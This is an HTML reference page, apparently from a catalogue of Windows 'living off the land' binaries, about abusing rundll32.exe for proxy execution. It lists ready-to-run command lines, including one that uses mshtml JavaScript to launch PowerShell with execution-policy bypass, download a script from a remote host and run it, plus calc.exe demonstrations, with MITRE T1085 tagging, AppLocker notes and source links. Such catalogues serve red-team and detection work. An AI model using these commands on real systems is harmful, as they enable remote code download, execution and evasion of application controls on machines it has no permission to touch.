<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Rundll32</title>
</head><body>AllTheThingsx64 would be a .DLL file and EntryPoint would be the name of the entry point in the .DLL file to execute.<br/>
rundll32.exe AllTheThingsx64,EntryPoint<br/>
<br/>
<br/>
Use Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.<br/>
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run(powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString("http://ip:port/");<br/>
<br/>
<br/>
Use Rundll32.exe to execute a JavaScript script that runs calc.exe.<br/>
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");<br/>
<br/>
<br/>
Use Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started.<br/>
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}<br/>
<br/>
<br/>
<ul>Windows binary: True</ul>
<ul>Bypasses Default AppLocker Rules: False</ul>
<ul>Mitre: <a href="https://attack.mitre.org/wiki/Technique/T1085">T1085</a></ul>
<ul><li>Links:</li>
</ul>
<ul><li style="list-style-type: none"><ul><li><a href="https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/">https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/</a></li>
<li><a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7</a></li>
<li><a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a></li>
<li><a href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/">https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/</a></li>
</ul>
</li>
</ul>
<ul><li>File path:</li>
</ul>
<ul><li style="list-style-type: none"><ul><li>C:\Windows\System32\rundll32.exe</li>
<li>C:\Windows\SysWOW64\rundll32.exe</li>
</ul>
</li>
</ul>
<ul><li>Acknowledgement:</li>
</ul>
<ul><li style="list-style-type: none"><ul><li>Name: Casey Smith</li>
<li style="list-style-type: none"><ul><li>Twitter: <a href="https://twitter.com/@Subtee">@Subtee</a></li>
<li>Blog: <a href="https://subt0x11.blogspot.com/">https://subt0x11.blogspot.com/</a></li>
</ul>
</li>
</ul>
</li>
</ul>
&nbsp;</body></html>